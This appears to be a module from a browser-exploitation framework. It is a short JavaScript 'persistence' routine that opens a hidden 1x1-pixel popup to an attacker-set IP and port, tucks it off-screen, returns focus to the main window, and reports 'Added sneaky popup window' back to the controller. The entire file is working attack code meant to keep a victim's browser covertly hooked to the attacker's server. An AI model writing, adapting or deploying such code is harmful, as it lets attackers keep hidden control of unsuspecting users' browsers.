this.name = 'persistence';
this.start = function() {
  window.open(dviide.ip + ':' + dviide.webport,'d','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,right='+screen.width+',top='+screen.height+'').blur();window.focus();
  dviide.callback('Added sneaky popup window. ' + dviide.ip);
}
